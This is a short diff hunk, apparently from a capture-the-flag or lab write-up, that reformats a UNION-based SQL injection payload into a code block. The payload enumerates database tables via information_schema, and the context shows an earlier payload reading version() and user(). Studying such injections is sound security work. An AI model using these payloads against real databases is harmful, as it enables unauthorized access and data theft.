@@ -968,7 +968,9 @@ Sending `CHAR(39) AND 1=2 UNION SELECT version(),version(),user(),3,4 -- ` (trai
 
 So we can use sql commands like `version()` to get information about the database running. We can try to get the list of Tables like so:
 
-`CHAR(39) AND 1=2 UNION SELECT version(),group_concat(table_name),database(),3,4 from information_schema.tables where table_schema=database() -- `:
+```sql
+CHAR(39) AND 1=2 UNION SELECT version(),group_concat(table_name),database(),3,4 from information_schema.tables where table_schema=database() --
+```
 
 Which gives us:
 
